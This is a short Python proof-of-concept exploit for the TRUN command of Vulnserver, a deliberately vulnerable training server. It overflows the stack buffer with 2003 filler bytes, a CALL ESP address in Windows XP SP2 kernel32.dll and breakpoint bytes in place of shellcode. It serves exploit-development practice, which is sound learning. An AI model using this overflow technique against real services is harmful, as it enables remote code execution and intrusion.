#########################################################################################
# Title: Vulnserver TRUN command exploit
# Author: Marco Lugo
# Description: find reliable way to jump to the stack.
#              A CALL ESP instruction is found in kernel32.dll at 0x7C82385D (WinXP SP2)
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

call_esp = struct.pack('<I', 0x7C82385D)

target_ip = sys.argv[1]
buffer = 'TRUN /.:/' 
pattern = '\x41'*2003 + call_esp + '\xCC'*3193
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


